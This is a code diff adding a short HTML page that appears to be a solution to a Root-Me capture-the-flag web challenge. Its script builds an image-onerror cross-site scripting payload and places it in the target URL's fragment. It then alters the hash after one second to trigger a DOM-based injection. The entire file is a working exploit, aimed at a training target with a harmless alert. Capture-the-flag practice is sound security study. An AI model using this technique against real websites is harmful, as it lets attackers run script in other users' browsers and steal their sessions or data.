@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const payload = "<img src=x onerror=alert(document.domain)>";
+  location.href = "http://challenge01.root-me.org/web-client/ch62/#" + encodeURIComponent(payload);
+  setTimeout(() => {
+    location.hash = location.hash + " ";
+  }, 1000);
+</script>
+</body>
+</html>
